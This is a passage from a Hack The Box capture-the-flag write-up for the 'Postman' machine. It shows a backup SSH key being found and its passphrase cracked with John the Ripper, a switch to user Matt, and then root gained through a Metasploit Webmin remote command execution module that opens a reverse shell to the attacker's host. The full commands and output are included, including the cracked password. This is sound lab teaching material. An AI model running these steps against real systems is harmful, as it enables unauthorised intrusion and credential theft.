+<p>We will need to get access to the <code class="highlighter-rouge">Matt</code> account.</p>
+
+<p>Having a look around <code class="highlighter-rouge">/var/lib/redis</code> we can see there is the usual <code class="highlighter-rouge">.bash_history</code> file of which we have read access.</p>
+
+<p>Viewing the contents we see commands that have been executed by <code class="highlighter-rouge">Matt</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
+<span class="nb">exit
+</span>su Matt
+<span class="nb">pwd
+</span>nano scan.py
+python scan.py
+nano scan.py
+clear
+nano scan.py
+clear
+python scan.py
+<span class="nb">exit
+exit
+cat</span> /etc/ssh/sshd_config 
+su Matt
+clear
+<span class="nb">cd</span> /var/lib/redis
+su Matt
+<span class="nb">exit
+cat </span>id_rsa.bak </code></pre></figure>
+
+<p>We quickly notice the file <code class="highlighter-rouge">id_rsa.bak</code>. We are obviously going with an <code class="highlighter-rouge">ssh</code> theme here.</p>
+
+<p>Let’s do a search for the file:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span>find / <span class="nt">-name</span> id_rsa.bak 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Permission denied"</span>
+/opt/id_rsa.bak</code></pre></figure>
+
+<p>Nice. Let’s try and use it straight away and see if there is a passphrase:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span>ssh <span class="nt">-i</span> /opt/id_rsa.bak <span class="nt">-l</span> Matt localhost
+Enter passphrase <span class="k">for </span>key <span class="s1">'/opt/id_rsa.bak'</span>: </code></pre></figure>
+
+<p>Looks like <code class="highlighter-rouge">Matt</code> isn’t a complete idiot.</p>
+
+<p>We will need to crack the key. <code class="highlighter-rouge">John The Ripper</code> will work well for this because we will need to convert the key to a readable format and <code class="highlighter-rouge">john</code> can do just that with <code class="highlighter-rouge">ssh2john</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python ssh2john.py ~/Documents/postman/id_rsa.bak <span class="o">&gt;</span> ~/Documents/postman/id_rsa.hash</code></pre></figure>
+
+<p>If you are using Kali you will find that <code class="highlighter-rouge">ssh2john</code> isn’t installed. You can download it from <a href="https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py">here</a>.</p>
+
+<p>Now let’s crack the hash:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">john <span class="nt">--wordlist</span><span class="o">=</span>/root/Wordlists/passwords/passwords.txt id_rsa.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+com....08     <span class="o">(</span>/root/Documents/postman/id_rsa.bak<span class="o">)</span>
+4g 0:00:02:44 DONE <span class="o">(</span>2019-12-03 10:44<span class="o">)</span> 0.02431g/s 1841Kp/s 1841Kc/s 1841KC/s 233091..hielox
+Session completed</code></pre></figure>
+
+<p>Ok I take back what I said. Matt’s an idiot! Now let’s try and login via ssh locally from the <code class="highlighter-rouge">redis</code> shell:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span>ssh <span class="nt">-i</span> /opt/id_rsa.bak <span class="nt">-l</span> Matt localhost
+Enter passphrase <span class="k">for </span>key <span class="s1">'/opt/id_rsa.bak'</span>: 
+Connection closed by ::1 port 22</code></pre></figure>
+
+<p>Look’s like we have an issue. The passphrase worked but <code class="highlighter-rouge">Matt</code> may not be allowed to <code class="highlighter-rouge">ssh</code> in. This reminds me that there was a command in <code class="highlighter-rouge">.bash_history</code> where <code class="highlighter-rouge">Matt</code> was messing around with <code class="highlighter-rouge">/etc/ssh/sshd_config</code> the configuration file for the ssh server. Taking a look we can see <code class="highlighter-rouge">Matt</code> has logging in via <code class="highlighter-rouge">ssh</code> disabled:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span><span class="nb">cat</span> /etc/ssh/sshd_config | <span class="nb">grep </span>DenyUsers
+DenyUsers Matt</code></pre></figure>
+
+<p>Let’s try the password with <code class="highlighter-rouge">su</code> instead:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span>su Matt
+Password: 
+Matt@Postman:/var/lib/redis<span class="nv">$ </span></code></pre></figure>
+
+<p>We can now grab the user flag in <code class="highlighter-rouge">Matt</code>’s home directory:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Matt@Postman:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+517ad0ec24....aac08a2f3c</code></pre></figure>
+
+<p>On to root!</p>
+
+<h2 id="root">Root</h2>
+
+<p>Let’s go checkout the <code class="highlighter-rouge">webmin</code> exploit we saw earlier that required valid credentials may be the way to go.</p>
+
+<p>One of those was <code class="highlighter-rouge">Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)</code> which is a <em>Metasploit</em> module:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf5 <span class="o">&gt;</span> search <span class="nb">type</span>:exploit name:webmin package
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                     Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                     <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+
+msf5 <span class="o">&gt;</span> use exploit/linux/http/webmin_packageup_rce
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD com....08
+PASSWORD <span class="o">=&gt;</span> computer2008
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username Matt
+username <span class="o">=&gt;</span> Matt
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost &lt;attacker-ip&gt;
+lhost <span class="o">=&gt;</span> 10.10.14.40
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts postman.htb
+rhosts <span class="o">=&gt;</span> postman.htb
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>ssl <span class="nb">true
+</span>ssl <span class="o">=&gt;</span> <span class="nb">true
+</span>msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.40:4444 
+<span class="o">[</span>+] Session cookie: 501c01341b72936a3e2c8cc9db790a16
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to execute the payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.40:4444 -&gt; 10.10.10.160:36478<span class="o">)</span> at 2019-12-03 11:02:32 <span class="nt">-0800</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">cat</span> /root/root.txt
+a257741c....5686ddce</code></pre></figure>
+
+<p>And we are done :)</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This machine was straight forward with sufficient research to establish how things work. Misconfigured <em>Redis</em> servers have been a real <a href="https://www.scmagazineuk.com/three-quarters-redis-servers-infected-malware/article/1472603">issue</a> in the past and can still be found today in the wild. Overall this was an enjoyable machine.</p>
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
